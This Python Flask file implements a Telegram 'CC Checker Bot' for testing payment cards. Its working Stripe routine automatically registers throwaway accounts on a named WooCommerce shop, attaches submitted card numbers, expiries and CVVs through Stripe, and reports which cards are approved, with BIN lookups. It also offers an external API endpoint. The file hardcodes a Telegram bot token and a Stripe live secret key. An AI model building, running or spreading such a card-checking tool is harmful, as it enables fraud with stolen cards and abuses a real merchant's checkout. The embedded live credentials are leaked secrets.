from flask import Flask, request, jsonify
import requests
import re
import threading
import random
import string

# --- Configuration ---
BOT_TOKEN = '8964801226:AAGb4hVVFutU1Z751HiqvztabIUUUkxWm8M'
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
TELEGRAM_EDIT_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"

# Stripe Live API Key (GANTI DENGAN API KEY LIVE ANDA)
STRIPE_LIVE_KEY = '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'

app = Flask(__name__)

# --- Function to send message to Telegram ---
def send_telegram_message(chat_id, text, reply_to_message_id=None):
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'HTML'
    }
    if reply_to_message_id:
        payload['reply_to_message_id'] = reply_to_message_id
    
    response = requests.post(f"{TELEGRAM_API_URL}sendMessage", json=payload)
    return response.json()

# --- Function to edit message in Telegram ---
def edit_telegram_message(chat_id, message_id, text):
    payload = {
        'chat_id': chat_id,
        'message_id': message_id,
        'text': text,
        'parse_mode': 'HTML'
    }
    requests.post(TELEGRAM_EDIT_URL, json=payload)

# --- Logic for Stripe Auth ---
def stripe_auth_check(cc, mm, yy, cvv):
    session = requests.Session()
    session.headers.update({'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'})
    
    if len(yy) == 4: 
        yy = yy[-2:]
    
    try:
        # Get login page
        login_page_res = session.get('https://shop.wiseacrebrew.com/account/', timeout=30)
        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
        
        if not login_nonce_match:
            return {"status": "Declined", "response": "Failed to get login nonce.", "decline_type": "process_error"}
        
        login_nonce = login_nonce_match.group(1)
        random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
        
        # Register account
        register_data = {
            'email': random_email,
            'password': 'Password123!',
            'woocommerce-register-nonce': login_nonce,
            '_wp_http_referer': '/account/',
            'register': 'Register'
        }
        session.post('https://shop.wiseacrebrew.com/account/', data=register_data, timeout=30)
        
        # Get payment page
        payment_page_res = session.get('https://shop.wiseacrebrew.com/account/add-payment-method/', timeout=30)
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        
        if not payment_nonce_match:
            return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
        
        ajax_nonce = payment_nonce_match.group(1)
        
        # Create payment method with Stripe
        stripe_data = (
            f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
            f'&key={STRIPE_LIVE_KEY}'
        )
        
        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, timeout=30)
        
        if stripe_response.status_code == 402:
            return {"status": "Declined", "response": stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.'), "decline_type": "card_decline"}
        
        payment_token = stripe_response.json().get('id')
        if not payment_token:
            return {"status": "Declined", "response": "Failed to retrieve Stripe token.", "decline_type": "process_error"}
        
        # Confirm setup intent
        site_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_token,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce
        }
        
        final_response = session.post('https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data, timeout=30)
        response_json = final_response.json()
        
        if response_json.get('success') is False or response_json.get('status') == 'error':
            error_message = (response_json.get('data', {}).get('error', {}).get('message') or 
                           re.sub('<[^<]+?>', '', response_json.get('messages', 'Declined by website.')))
            return {"status": "Declined", "response": error_message.strip(), "decline_type": "card_decline"}
        
        if response_json.get('status') == 'succeeded':
            return {"status": "Approved", "response": "Payment method successfully added.", "decline_type": "none"}
        else:
            return {"status": "Declined", "response": "Unknown response from website.", "decline_type": "process_error"}
            
    except Exception as e:
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}", "decline_type": "process_error"}

# --- Logic for Braintree Auth ---
def braintree_check(cc, mm, yy, cvv):
    # Placeholder - implement your Braintree logic here
    return {"status": "Declined", "response": "Braintree not implemented yet.", "decline_type": "process_error"}

# --- Logic for Stripe Charge ---
def stripe_charge_check(cc, mm, yy, cvv):
    # Placeholder - implement your Stripe Charge logic here
    return {"status": "Declined", "response": "Stripe Charge not implemented yet.", "decline_type": "process_error"}

# --- BIN Info Function ---
def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10)
        return response.json() if response.status_code == 200 else {}
    except Exception:
        return {}

# --- Background Task Function ---
def background_task(chat_id, message_id, full_cc_string, gateway_function, gateway_name):
    try:
        parts = full_cc_string.split('|')
        if len(parts) != 4:
            edit_telegram_message(chat_id, message_id, "❌ Format salah! Gunakan: CC|MM|YY|CVV")
            return
        
        cc, mm, yy, cvv = parts
        check_result = gateway_function(cc, mm, yy, cvv)
        bin_info = get_bin_info(cc[:6])
        
        status = check_result.get('status', 'Declined')
        response_message = check_result.get('response', 'No response.')
        
        brand = bin_info.get('brand', 'Unknown')
        card_type = bin_info.get('type', 'Unknown')
        country = bin_info.get('country_name', 'Unknown')
        country_flag = bin_info.get('country_flag', '🏳️')
        bank = bin_info.get('bank', 'Unknown')
        
        if status == "Approved":
            final_message = f"""<b>✅ APPROVED ({gateway_name})</b>

<b>💳 Card:</b> <code>{full_cc_string}</code>
<b>📝 Response:</b> {response_message}

<b>ℹ️ Info:</b> {brand} - {card_type}
<b>🏦 Issuer:</b> {bank}
<b>🌍 Country:</b> {country} {country_flag}"""
        else:
            final_message = f"""<b>❌ DECLINED ({gateway_name})</b>

<b>💳 Card:</b> <code>{full_cc_string}</code>
<b>📝 Response:</b> {response_message}

<b>ℹ️ Info:</b> {brand} - {card_type}
<b>🏦 Issuer:</b> {bank}
<b>🌍 Country:</b> {country} {country_flag}"""
        
        edit_telegram_message(chat_id, message_id, final_message)
    except Exception as e:
        edit_telegram_message(chat_id, message_id, f"❌ Error: {str(e)}")

# --- Telegram Webhook Handler ---
@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        
        if 'message' in update:
            message = update['message']
            chat_id = message['chat']['id']
            text = message.get('text', '')
            
            # Handle /start command
            if text == '/start':
                welcome_msg = """<b>🤖 CC Checker Bot Active!</b>

<b>📌 Available Commands:</b>
/stripe_auth <cc|mm|yy|cvv> - Check card with Stripe Auth
/stripe_charge <cc|mm|yy|cvv> - Check card with Stripe Charge
/braintree <cc|mm|yy|cvv> - Check card with Braintree

<b>📝 Example:</b>
<code>/stripe_auth 4111111111111111|12|25|123</code>

<b>⚡ Status:</b> Online"""
                send_telegram_message(chat_id, welcome_msg)
                return jsonify({"status": "ok"})
            
            # Handle /stripe_auth command
            if text.startswith('/stripe_auth'):
                parts = text.split(' ', 1)
                if len(parts) < 2:
                    send_telegram_message(chat_id, "❌ Usage: /stripe_auth CC|MM|YY|CVV")
                    return jsonify({"status": "ok"})
                
                card_str = parts[1].strip()
                
                # Validate format
                if len(card_str.split('|')) != 4:
                    send_telegram_message(chat_id, "❌ Format salah! Gunakan: CC|MM|YY|CVV")
                    return jsonify({"status": "ok"})
                
                # Send initial message
                sent_msg = send_telegram_message(chat_id, f"🔄 Processing Stripe Auth for <code>{card_str}</code>...")
                if 'result' in sent_msg and 'message_id' in sent_msg['result']:
                    message_id = sent_msg['result']['message_id']
                    # Run in background
                    thread = threading.Thread(target=background_task, args=(chat_id, message_id, card_str, stripe_auth_check, "Stripe Auth"))
                    thread.start()
            
            # Handle /stripe_charge command
            elif text.startswith('/stripe_charge'):
                parts = text.split(' ', 1)
                if len(parts) < 2:
                    send_telegram_message(chat_id, "❌ Usage: /stripe_charge CC|MM|YY|CVV")
                    return jsonify({"status": "ok"})
                
                card_str = parts[1].strip()
                
                if len(card_str.split('|')) != 4:
                    send_telegram_message(chat_id, "❌ Format salah! Gunakan: CC|MM|YY|CVV")
                    return jsonify({"status": "ok"})
                
                sent_msg = send_telegram_message(chat_id, f"🔄 Processing Stripe Charge for <code>{card_str}</code>...")
                if 'result' in sent_msg and 'message_id' in sent_msg['result']:
                    message_id = sent_msg['result']['message_id']
                    thread = threading.Thread(target=background_task, args=(chat_id, message_id, card_str, stripe_charge_check, "Stripe Charge"))
                    thread.start()
            
            # Handle /braintree command
            elif text.startswith('/braintree'):
                parts = text.split(' ', 1)
                if len(parts) < 2:
                    send_telegram_message(chat_id, "❌ Usage: /braintree CC|MM|YY|CVV")
                    return jsonify({"status": "ok"})
                
                card_str = parts[1].strip()
                
                if len(card_str.split('|')) != 4:
                    send_telegram_message(chat_id, "❌ Format salah! Gunakan: CC|MM|YY|CVV")
                    return jsonify({"status": "ok"})
                
                sent_msg = send_telegram_message(chat_id, f"🔄 Processing Braintree for <code>{card_str}</code>...")
                if 'result' in sent_msg and 'message_id' in sent_msg['result']:
                    message_id = sent_msg['result']['message_id']
                    thread = threading.Thread(target=background_task, args=(chat_id, message_id, card_str, braintree_check, "Braintree"))
                    thread.start()
        
        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# --- Set Webhook Endpoint ---
@app.route('/set_webhook', methods=['GET'])
def set_webhook():
    webhook_url = f"https://stripe-charge-1-7y07.onrender.com/webhook/{BOT_TOKEN}"  # Ganti dengan domain Anda
    response = requests.get(f"{TELEGRAM_API_URL}setWebhook?url={webhook_url}")
    return jsonify(response.json())

# --- Remove Webhook Endpoint ---
@app.route('/remove_webhook', methods=['GET'])
def remove_webhook():
    response = requests.get(f"{TELEGRAM_API_URL}deleteWebhook")
    return jsonify(response.json())

# --- API Endpoints for External Use ---
@app.route('/stripe_auth', methods=['GET'])
def stripe_auth_endpoint():
    card_str = request.args.get('card')
    if not card_str:
        return jsonify({"error": "Card parameter required"}), 400
    
    try:
        cc, mm, yy, cvv = card_str.split('|')
        check_result = stripe_auth_check(cc, mm, yy, cvv)
        bin_info = get_bin_info(cc[:6])
        final_result = {"status": check_result["status"], "response": check_result["response"], "bin_info": bin_info}
        return jsonify(final_result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/braintree', methods=['POST'])
def braintree_endpoint():
    data = request.get_json()
    if not data or 'chat_id' not in data or 'message_id' not in data or 'card' not in data:
        return jsonify({"error": "Missing parameters"}), 400
    
    thread = threading.Thread(target=background_task, args=(data['chat_id'], data['message_id'], data['card'], braintree_check, "Braintree"))
    thread.start()
    return jsonify({"status": "Process started."})

@app.route('/stripe_charge', methods=['POST'])
def stripe_charge_endpoint():
    data = request.get_json()
    if not data or 'chat_id' not in data or 'message_id' not in data or 'card' not in data:
        return jsonify({"error": "Missing parameters"}), 400
    
    thread = threading.Thread(target=background_task, args=(data['chat_id'], data['message_id'], data['card'], stripe_charge_check, "Stripe Charge"))
    thread.start()
    return jsonify({"status": "Process started."})

@app.route('/', methods=['GET'])
def home():
    return jsonify({"status": "Bot is running!", "bot_token": BOT_TOKEN[:10] + "...", "stripe_key": STRIPE_LIVE_KEY[:15] + "..."})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=True)
